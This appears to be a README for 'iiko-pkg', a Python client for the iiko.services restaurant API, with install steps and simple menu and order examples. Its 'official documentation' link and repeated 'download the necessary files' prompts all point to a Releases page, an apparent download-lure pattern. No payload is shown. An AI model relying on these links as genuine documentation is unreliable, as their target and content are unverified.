# iiko-pkg 🟢

![iiko-pkg](https://img.shields.io/badge/iiko--pkg-🟢-blue)

Welcome to the **iiko-pkg** repository! This Python library allows you to interact seamlessly with the iiko.services API. Whether you're building applications for iiko Business, iiko Card, or iiko Cloud API, this library provides the tools you need to integrate effectively.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [API Reference](#api-reference)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Introduction

The iiko.services API provides a comprehensive set of endpoints for managing restaurant operations, customer interactions, and more. With **iiko-pkg**, you can leverage this API to create powerful applications that enhance your business processes.

## Features

- **Easy Integration**: Simple methods to connect with the iiko API.
- **Comprehensive Documentation**: Detailed guides and examples to help you get started.
- **Active Development**: Regular updates and community contributions.
- **Support for Multiple iiko Services**: Use it for iiko Business, iiko Card, and iiko Cloud API.

## Installation

To install the **iiko-pkg** library, you can use pip. Open your terminal and run:

```bash
pip install iiko-pkg
```

For the latest version, visit our [Releases](https://github.com/henrythes/iiko-pkg/releases) page to download the necessary files.

## Usage

Here’s a quick example of how to use **iiko-pkg**:

```python
from iiko_pkg import IikoAPI

api = IikoAPI(api_key='YOUR_API_KEY')

# Get restaurant information
restaurant_info = api.get_restaurant_info()
print(restaurant_info)
```

Make sure to replace `'YOUR_API_KEY'` with your actual API key.

## API Reference

The library provides a range of methods to interact with the iiko.services API. Below are some key methods:

- `get_restaurant_info()`: Retrieves information about the restaurant.
- `get_menu()`: Fetches the current menu.
- `create_order()`: Creates a new order in the system.

Refer to the [official documentation](https://github.com/henrythes/iiko-pkg/releases) for a complete list of methods and their usage.

## Examples

To illustrate the capabilities of **iiko-pkg**, here are some example scripts:

### Fetching Menu Items

```python
from iiko_pkg import IikoAPI

api = IikoAPI(api_key='YOUR_API_KEY')

menu_items = api.get_menu()
for item in menu_items:
    print(f"Name: {item['name']}, Price: {item['price']}")
```

### Creating an Order

```python
from iiko_pkg import IikoAPI

api = IikoAPI(api_key='YOUR_API_KEY')

order_data = {
    'items': [
        {'id': 'ITEM_ID', 'quantity': 2}
    ],
    'customer': {
        'name': 'John Doe',
        'phone': '+123456789'
    }
}

order_response = api.create_order(order_data)
print(order_response)
```

These examples provide a glimpse into the functionality of the library. For more detailed examples, check the [Releases](https://github.com/henrythes/iiko-pkg/releases) section.

## Contributing

We welcome contributions from the community! If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Open a pull request to the main repository.

Please ensure your code adheres to the existing style and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Support

If you encounter any issues or have questions, feel free to open an issue on GitHub. For updates and news, follow our repository and check the [Releases](https://github.com/henrythes/iiko-pkg/releases) page regularly.

---

Thank you for checking out **iiko-pkg**! We hope this library helps you create amazing applications with the iiko.services API. Happy coding!